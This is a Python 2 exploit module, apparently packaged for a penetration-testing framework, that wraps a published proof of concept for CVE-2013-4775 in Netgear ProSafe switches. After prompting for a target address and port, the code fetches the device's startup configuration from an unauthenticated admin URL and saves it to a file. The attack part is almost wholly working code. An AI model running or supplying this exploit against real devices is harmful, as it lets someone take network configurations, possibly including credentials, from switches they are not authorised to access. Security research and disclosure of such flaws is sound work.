
def about():
	print '''Netgear ProSafe - CVE-2013-4775 PoC written by Juan J. Guelfo @ Encripto AS
post@encripto.no
Copyright 2013 Encripto AS. All rights reserved.
This software is licensed under the FreeBSD license.
http://www.encripto.no/tools/license.php
	'''
def auto_help(name,rank,description):
	stbl = "  " + name + " "*(12-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (netgearProSafe)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("netgearProSafe","Normal","Description")
except:
	pass

def auto_info(name="",module="",plat="",priv="",lic="",rank="Normal",release="N/A",by="N/A"):
	print
	print "Publisher Information for netgearProSafe"
	print
	print "	   Name:","netgearProSafe"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","FreeBSD"
	print "	   Rank:",rank
	print "  Disclosed:",release
	print "Author:","Juan J."

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(12-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class netgearProSafe(object):
	def start(self):
		#!/usr/bin/python
		
		################################################################
		#
		# Netgear ProSafe - CVE-2013-4775 PoC	
		# written by Juan J. Guelfo @ Encripto AS	
		# post@encripto.no
		#	
		# Copyright 2013 Encripto AS. All rights reserved.
		#	
		# This software is licensed under the FreeBSD license.
		# http://www.encripto.no/tools/license.php
		#	
		################################################################
		
		import sys, getopt, urllib2
		
		
		__version__ = "0.1"
		__author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"
		
		# Prints title and other header info
		def header():
			print ""
			print "="*36
			print "|  Netgear ProSafe - CVE-2013-4775 PoC".format(__version__)
			print "|  by {0}".format(__author__)
			print "="*36
			print ""
		
		# Prints help	
		def help():
			header()
			print """
		   Usage: python CVE-2013-4775.py [mandatory options]
		
		   Mandatory options:
			   -t target			   ...Target IP address
			   -p port				 ...Port where the HTTP admin interface is listening on
			   -o file				 ...Output file where the config will be written to
				
		   Example:
			   python CVE-2013-4775.py -t 192.168.0.1 -p 80 -o output.txt
			"""
			
		if True:
			#Parse options
			target = raw_input("Target: ")
			port = input("Port: ")
			output = raw_input("Output File: ")
			reset = None
			
			header()
			print "[+] Trying to connect to {0}:{1}...".format(target, port)
			headers = { "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" }
		
			try:
				# Get the startup config via HTTP admin interface
				r = urllib2.Request("http://%s:%s/filesystem/startup-config" % (target, port), None, headers)
				startup_config = urllib2.urlopen(r).read()
				print "[+] Connected..."
				
				# Write results to output file
				print "[+] Writing startup config to {0}...\n".format(output)
				fw = open(output, 'w')
				fw.write(startup_config)
				fw.close()
			
			except urllib2.URLError:
				print "[-] Error: The connection could not be established.\n"
				
			except IOError as e:
				print "[-] Error: {0}...\n".format(e.strerror)

def show_opt():
	print
	print "Module Options (netgearProSafe)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	try:
		TIMEOUT
	except:
		TIMEOUT = 5
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"Netgear"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "proc":
		try:
			program = netgearProSafe()
			program.start()
		except Exception as e:
			print e
			print "[-] Failed"
			time.sleep(0.3)
			show_opt()
except:
	pass
